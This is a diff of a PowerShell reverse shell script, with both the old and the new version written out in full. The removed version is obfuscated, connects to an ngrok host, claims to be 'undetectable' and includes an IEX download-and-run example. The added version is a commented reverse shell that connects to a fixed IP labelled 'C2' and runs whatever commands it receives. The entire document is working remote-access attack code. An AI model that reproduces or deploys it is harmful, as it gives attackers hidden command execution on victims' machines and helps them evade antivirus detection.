@@ -1,19 +1,43 @@
-#based on original script by @nikhil_mitt. Change ip and port
-#Undetectable on 05/09/2022
-# Example  IEX(New-Object Net.WebClient).downloadString('http://192.168.43.16/<file>.ps1')
+do {
+    # Delay before establishing network connection, and between retries
+    Start-Sleep -Seconds 1
 
-$KLK = New-Object System.Net.Sockets.TCPClient('0.tcp.eu.ngrok.io','11276');
-$PLP = $KLK.GetStream();
-[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
-$VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
-$PLP.Write($VVCCA,0,$VVCCA.Length)
-$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ')
-$PLP.Write($VVCCA,0,$VVCCA.Length)
-[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
-while(($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA,0, $A);
-$VZZS = (i`eX $DD 2>&1 | Out-String );
-$HHHHHH  = $VZZS + (pwd).Path + '! ';
-$L = ([text.encoding]::UTF8).GetBytes($HHHHHH);
-$PLP.Write($L,0,$L.Length);
-$PLP.Flush()};
-$KLK.Close()
+    # Connect to C2
+    try{
+        $TCPClient = New-Object Net.Sockets.TCPClient('147.185.221.20','10626')
+    } catch {}
+} until ($TCPClient.Connected)
+
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+
+# Writes a string to C2
+function WriteToStream ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+
+    # Write to C2
+    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Flush()
+}
+
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteToStream ''
+
+# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
+
+    # Write output to C2
+    WriteToStream ($Output)
+}
+# Closes the StreamWriter and the underlying TCPClient
+$StreamWriter.Close()
